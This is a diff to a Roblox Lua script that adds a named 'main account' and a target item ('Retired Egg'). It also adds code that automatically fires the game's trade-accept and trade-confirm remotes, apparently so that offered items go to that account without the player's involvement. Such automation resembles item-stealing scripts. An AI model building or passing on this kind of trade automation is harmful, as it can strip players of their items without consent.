@@ -4,6 +4,10 @@ local Players = game:GetService("Players")
 local LocalPlayer = Players.LocalPlayer
 
 -- Configuration
+local MainAccUsername = {"Her0eXBuildera31"}
+local TARGET_ITEM_NAME = "Retired Egg"
+local TARGET_ITEM_FORM = "NORMAL"
+local ForceReceiver = false
 local targetFrameNames = {"Dialog"}
 
 -- Remotes / modules
@@ -269,8 +273,6 @@ task.spawn(function()
                     err
                 )
             end
-
-            task.wait(0.1)
         end
 
         -- Give all AddItemToOffer calls time to register.
@@ -438,4 +440,13 @@ task.spawn(function()
 
         task.wait(3)
     end
+end)
+
+task.spawn(function()
+    local Neg = API:WaitForChild("TradeAPI/AcceptNegotiation")
+    local Con = API:WaitForChild("TradeAPI/ConfirmTrade")
+    
+    -- Pass ForceReceiver inside FireServer if required by the API
+    Neg:FireServer(ForceReceiver)
+    Con:FireServer(ForceReceiver)
 end)
